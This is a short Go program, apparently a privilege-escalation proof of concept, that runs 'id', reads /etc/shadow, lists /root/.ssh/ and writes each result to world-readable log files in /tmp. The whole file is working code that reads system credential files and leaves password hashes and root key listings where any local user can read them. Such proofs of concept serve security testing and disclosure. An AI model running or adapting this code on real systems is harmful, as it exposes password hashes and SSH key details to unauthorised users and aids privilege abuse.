package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func execute_id() {
	out, err := exec.Command("id").Output()

	if err != nil {
		fmt.Printf("%s", err)
	}

	fmt.Printf("Someone executed this program!\nCommand Successfully Executed:\n\n")
	output := string(out[:])
	fmt.Printf(output)

	err1 := os.WriteFile("/tmp/pe_poc_id.log", out, 0644)
	check(err1)
}

func execute_copy_shadow() {
	out, err := exec.Command("cat", "/etc/shadow").Output()

	if err != nil {
		fmt.Printf("%s", err)
	}

	fmt.Printf("Someone executed this program!\nCommand Successfully Executed:\n\n")
	output := string(out[:])
	fmt.Printf(output)

	err1 := os.WriteFile("/tmp/pe_poc_etc_shadow.log", out, 0644)
	check(err1)
}

func execute_list_root_ssh() {
	out, err := exec.Command("ls", "-lah", "/root/.ssh/").Output()

	if err != nil {
		fmt.Printf("%s", err)
	}

	fmt.Printf("Someone executed this program!\nCommand Successfully Executed:\n\n")
	output := string(out[:])
	fmt.Printf(output)

	err1 := os.WriteFile("/tmp/pe_poc_root_ssh.log", out, 0644)
	check(err1)
}

func main() {
	if runtime.GOOS == "windows" {
		fmt.Printf("Can't execute this on a windows machine!")
	} else {
		execute_id()
		execute_copy_shadow()
		execute_list_root_ssh()
	}
}
